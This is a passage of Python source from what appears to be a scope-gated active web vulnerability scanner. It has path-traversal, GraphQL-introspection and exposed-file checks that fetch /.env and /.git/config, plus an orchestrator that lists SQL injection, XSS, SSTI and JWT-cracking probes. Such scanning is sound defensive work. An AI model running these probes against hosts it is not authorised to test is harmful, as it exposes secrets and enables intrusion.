                ev = {"request_line": f"GET {_with_query(url, {param: payload})}", "response_status": f"HTTP {probe['status']}",
                      "matched_value": f"{fname} contents disclosed via '{param}'"}
                return _finding("active.path-traversal", f"Path traversal / local file read via '{param}' parameter",
                                "high", "disclosure", "file-upload", url, proof, ev)
    return None


_GRAPHQL_INTROSPECTION_QUERY = "{__schema{queryType{name} types{name}}}"


def _check_graphql_introspection(http: _Http, url: str) -> dict[str, Any] | None:
    """Confirm GraphQL introspection is enabled — the schema map that turns a black-box GraphQL
    API into a listed set of hidden queries/mutations (a lead for BOLA/BFLA). Only fires on a
    graphql-shaped path, so it costs nothing elsewhere. GET-only, read-only."""
    path = (urlparse(url).path or "").lower()
    if "graphql" not in path and "graphiql" not in path:
        return None
    try:
        probe = http.fetch(_with_query(url, {"query": _GRAPHQL_INTROSPECTION_QUERY}))
    except _ActiveError:
        return None
    body = probe.get("body") or ""
    ctype = (probe["headers"].get("content-type") or "").lower()
    if '"__schema"' in body and '"queryType"' in body and ("json" in ctype or body.lstrip().startswith("{")):
        proof = _proof(
            "confirmed", method="GET introspection query on the GraphQL endpoint",
            affected_asset="the full GraphQL schema — types, queries, and mutations, including operations the UI never exposes",
            observed_result="the endpoint answered an introspection query, returning its __schema (queryType + types)",
            control_result="introspection is enabled here; production GraphQL endpoints should disable it",
            evidence="the response body contains the GraphQL __schema/queryType introspection result",
        )
        ev = {"request_line": f"GET {_with_query(url, {'query': _GRAPHQL_INTROSPECTION_QUERY})}",
              "response_status": f"HTTP {probe['status']}", "matched_value": "__schema introspection returned"}
        return _finding("active.graphql-introspection", "GraphQL introspection enabled (schema disclosure)",
                        "low", "disclosure", "graphql", url, proof, ev)
    return None


# High-signal files that must never be web-served. Each is confirmed by its own unmistakable
# signature AND a catch-all control, so an app that 200s everything can't false-positive.
_EXPOSED_FILES: tuple[tuple[str, "re.Pattern[str]", str], ...] = (
    ("/.git/config", re.compile(r"\[core\][\s\S]*repositoryformatversion", re.IGNORECASE), ".git/config (source repository)"),
    ("/.env", re.compile(r"(?m)^[A-Z][A-Z0-9_]{2,}\s*=\S"), ".env (application secrets/config)"),
)


def _check_sensitive_paths(http: _Http, url: str) -> dict[str, Any] | None:
    """Confirm a high-signal file is served (.git/config, .env) by fetching it at the origin root
    and gating on the file's own signature PLUS a catch-all control (a path that shouldn't exist)
    — so an app that 200s everything can't false-positive. Runs only for the site root, so it
    probes each host's paths once, not per discovered URL. GET-only, read-only."""
    parts = urlparse(url)
    if (parts.path or "/").strip("/"):
        return None  # only at the site root -> one probe set per host, not per discovered URL
    origin = f"{parts.scheme}://{parts.netloc}"
    try:
        control = http.fetch(f"{origin}/{_MARK}-nonexistent-{_MARK}")
    except _ActiveError:
        return None
    ctrl_body = control.get("body") or ""
    for path, signature, name in _EXPOSED_FILES:
        if signature.search(ctrl_body):
            continue  # the catch-all already carries this signature -> not a genuinely served file
        try:
            probe = http.fetch(f"{origin}{path}")
        except _ActiveError:
            break
        body = probe.get("body") or ""
        status = int(probe.get("status") or 0)
        if 200 <= status < 300 and signature.search(body) and body != ctrl_body:
            proof = _proof(
                "confirmed", method=f"GET {path}",
                affected_asset="source/config/secrets served directly by the web server",
                observed_result=f"{name} is served at {path} (HTTP {status}) with its characteristic contents",
                control_result="a non-existent control path did NOT return this content — the file is genuinely exposed, not a catch-all 200",
                evidence=f"the response body carries the unmistakable {name} signature",
            )
            ev = {"request_line": f"GET {origin}{path}", "response_status": f"HTTP {status}", "matched_value": f"{name} exposed"}
            return _finding("active.exposed-file", f"Sensitive file exposed: {path}", "high", "disclosure", "disclosure", url, proof, ev)
    return None


def verify_active(
    target_url: str,
    findings: list[dict[str, Any]],
    *,
    scope: str = "",
    requests_budget: int = 12,
    settings: Any = None,
    governor: HostRateGovernor | None = None,
    http: _Http | None = None,
    time_based: bool = False,
    auth: AuthContext | None = None,
    extra_params: list[str] | None = None,
) -> tuple[list[dict[str, Any]], dict[str, Any]]:
    """Run the active checks against an in-scope target. Returns
    ``(active_findings, meta)``. ``active_findings`` are confirmed/candidate finding
    dicts carrying a ``_active_proof`` for the orchestrator to merge; ``meta`` records
    the authorization/scope/budget outcome for the report.

    ``extra_params`` are parameter NAMES recon discovered for this host (mined from the
    target's own JS/HTML). The param-keyed checks probe URL params UNION these, so an
    endpoint that carries no query string itself still gets its real parameters tested —
    the surface recon found but the prover previously ignored."""
    settings = settings or get_settings()
    discovered_params = _clean_param_names(extra_params)
    try:
        normalized = normalize_website_url(target_url)
    except WebsiteFetchError as exc:
        return [], {"in_scope": False, "skipped_reason": str(exc), "host": "", "requests_used": 0, "rate_limited": False, "verified_classes": []}
    host = urlparse(normalized).hostname or ""

    # Scope binding FIRST (no DNS, fail-closed): an unnamed host never gets probed.
    if not host_in_active_scope(host, scope, settings):
        return [], {
            "in_scope": False, "host": host, "requests_used": 0, "rate_limited": False, "verified_classes": [],
            "skipped_reason": f"'{host}' was not named in the hunt scope, so active verification was skipped (passive only). "
                              "Name the host in Scope, set GREYIQ_ACTIVE_SCAN_ALLOWLIST, or scan your own infra with GREYIQ_SCAN_ALLOW_PRIVATE_URLS=1.",
        }
    # Then the same SSRF/private/port guard the passive scanner uses (this resolves DNS).
    try:
        sanitized = _guard_url(normalized, settings.allow_private_urls, settings.web_allowed_ports)
    except WebsiteFetchError as exc:
        return [], {"in_scope": True, "host": host, "requests_used": 0, "rate_limited": False, "verified_classes": [], "skipped_reason": f"target refused by the URL guard: {exc}"}
    host = urlparse(sanitized).hostname or host

    governor = governor or HostRateGovernor(
        capacity=settings.active_max_requests_per_host,
        min_interval_s=settings.active_min_interval_ms / 1000.0,
    )
    http = http or _Http(settings, governor, max_requests=requests_budget, auth=auth)

    # Fetch the landing page once so header-only checks (clickjacking) reuse it.
    landing: dict[str, Any] | None = None
    rate_limited = False
    try:
        landing = http.fetch(sanitized)
    except _RateLimited:
        rate_limited = True
    except _ActiveError:
        landing = None

    results: list[dict[str, Any]] = []
    # Order: header-only first (cheap), then the request-heavier probes. Each check
    # is wrapped so a budget exhaustion stops cleanly without raising.
    checks: list[Callable[[], dict[str, Any] | None]] = [
        lambda: _check_clickjacking(http, sanitized, landing),
        lambda: _check_csrf(landing, sanitized),
        # Self-gated cheap checks run FIRST so the network-heavy probes below can't exhaust the
        # request budget before they're reached: alg:none / weak-secret are no-ops unless the
        # operator supplied a real JWT (weak-secret cracks the HMAC key OFFLINE and spends requests
        # only on a hit), and GraphQL introspection only fires on a graphql-shaped path.
        lambda: _check_jwt_alg_none(http, sanitized),
        lambda: _check_jwt_weak_secret(http, sanitized),
        lambda: _check_graphql_introspection(http, sanitized),
        lambda: _check_cors(http, sanitized),
        lambda: _check_open_redirect(http, sanitized, discovered_params),
        lambda: _check_host_header(http, sanitized),
        lambda: _check_reflected_xss(http, sanitized, discovered_params),
        lambda: _check_ssti(http, sanitized, discovered_params),
        lambda: _check_error_sqli(http, sanitized, discovered_params),
        lambda: _check_bool_sqli(http, sanitized, discovered_params),
        lambda: _check_nosqli(http, sanitized, discovered_params),
        lambda: _check_crlf(http, sanitized, discovered_params),
        # Open-bucket is GET-only and scope-gated; safe in the default pass.
        lambda: _check_open_bucket(http, landing, scope, settings),
        # Sensitive-file exposure (.git/.env) only probes at the site root, so it's one cheap
        # set per host; signature + catch-all control keeps it false-positive-proof.
        lambda: _check_sensitive_paths(http, sanitized),
        # Path traversal / LFI reads ONE well-known system file as proof (signature + control),
        # extracting nothing else; GET-only. Heaviest of the new checks, so it runs LAST and only
        # uses whatever request budget the earlier checks left.
        lambda: _check_path_traversal(http, sanitized, discovered_params),
    ]
    # Time-based blind SQLi is the only check that emits an executing payload (a bounded
    # SLEEP), so it is OPT-IN — appended only when the operator explicitly enables it.
    if time_based:
        checks.append(lambda: _check_time_sqli(http, sanitized, settings, discovered_params))
    for check in checks:
        if rate_limited:
            break
        try:
            result = check()
        except _RateLimited:
            rate_limited = True
            break
        except (_ActiveError, WebsiteFetchError):
            # _Http.fetch() funnels every request through normalize_website_url() /
            # _guard_url() inside guarded_dns_scope() -- a URL that grew past
            # MAX_URL_LENGTH once THIS check appended its injected marker, or a host
            # whose DNS answer changed to something private/reserved between the
            # initial guard and this later request, raises WebsiteFetchError (a
            # ValueError subclass), not _ActiveError. Skip just this one check, same
            # as any other per-request failure -- it must never abort every check
            # ordered after it.
            result = None
        if result:
            results.append(result)

    verified = sorted({r["_active_class_hint"] for r in results if r.get("_active_proof", {}).get("status") == "confirmed"})
    meta = {
        "in_scope": True, "host": host, "requests_used": getattr(http, "sent", 0),
        "rate_limited": rate_limited, "verified_classes": verified,
        "discovered_params_used": len(discovered_params),
        "skipped_reason": "",
    }
    return results, meta
